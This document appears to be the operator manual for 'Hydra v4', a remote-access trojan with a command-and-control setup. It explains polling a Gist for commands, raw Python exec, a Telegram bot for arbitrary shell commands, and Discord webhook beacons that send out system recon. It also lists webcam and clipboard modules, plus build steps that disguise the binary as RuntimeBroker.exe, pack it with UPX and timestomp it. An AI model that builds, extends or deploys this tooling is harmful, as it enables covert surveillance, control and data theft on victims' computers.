# Hydra v4 C2 Command Reference

## How agents receive commands

The Gist at the C2 URL is polled every 25-55 seconds (randomized).
Each line is a command. Commands already executed are tracked by SHA256 hash.

## Command format

### Module execution
```
mod("module_name", ["arg1","arg2"])
```
Examples:
```
mod("popup", ["PRANK","You have been hacked by Hydra!"])
mod("bsod")
mod("audio")
mod("browser", ["https://youtube.com/watch?v=dQw4w9WgXcQ"])
mod("webcam")
mod("clipboard", ["your text here"])
mod("monitor")
mod("taskbar")
mod("cd_tray", ["open"])
mod("wallpaper")
mod("cursor", ["30"])
mod("screen_flash", ["red","5"])
mod("notepad", ["10"])
mod("file_reverse")
mod("selfdestruct")
```

### Raw Python exec
```
# Anything valid Python - exec()'d in agent namespace
import os; os.system("calc")
```

### Comments
```
# Lines starting with # are ignored
```

## Telegram bot commands

Once the bot is connected (same token as v3):
- `/cmd <shell command>` — execute any shell command, get output back
- Module commands go through Gist, not Telegram

## Discord webhook

Agents post to the webhook when:
1. Agent comes online (first beacon)
2. Recon completes (system survey results)
3. Command results (only if result != "OK" or command was "ping")
4. Telegram bot launches/fails

## Gist encryption

Commands in the Gist can be XOR-encrypted with the C2 key:
- Plaintext mode: regular Python lines (if beginner users)
- Encrypted mode: XOR with C2_KEY before writing to Gist
- Agent tries decrypt first, falls back to plaintext if garbage

## XOR encryption (for secure commands)

```python
# On your machine:
from xor_encoder import xor_encode, _XK

# Encode a command
cmd = 'mod("bsod")'
key = b"hydra_c2_key_v4"  # Must match C2_KEY in core.py
result = bytes(a ^ b for a, b in zip(cmd.encode(), key * (len(cmd) // len(key) + 1)))
print(result.hex())

# Paste hex into Gist. Agent will decrypt with same key.
```

## Build profiles

| Profile | Console | UPX | Poll Speed | File Name |
|---------|---------|-----|-----------|-----------|
| dev     | Yes     | No  | 25-35s   | hydra_dev.exe |
| stealth | No      | Yes | 25-55s   | RuntimeBroker.exe |
| demo    | Yes     | No  | 3-5s     | hydra_demo.exe |

## Building

```bash
# Install deps
uv pip install pyinstaller

# Build stealth profile (production)
python build.py --profile stealth

# Build dev profile (testing)
python build.py --profile dev

# Build demo profile (flashy, fast polling for demos)
python build.py --profile demo

# Clean build artifacts + restore core.py
python build.py --clean
```

The build script:
1. Backs up core.py → core.py.bak
2. XOR-encodes real secrets (Gist URL, webhook, TG token) into core.py
3. Runs PyInstaller with the encoded core.py
4. UPX-packs the output (stealth only)
5. Timestomps the EXE to Jan 15, 2024
6. Restores core.py from backup (your source stays clean)

## Quick test flow

```bash
# 1. Build
python build.py --profile dev

# 2. Run (console visible for debugging)
dist/hydra_dev.exe --dev

# 3. Check Discord webhook for beacon + recon

# 4. Send a test command by editing the Gist
mod("ping")

# 5. Check Discord for "PONG from HOSTNAME\USER"
```
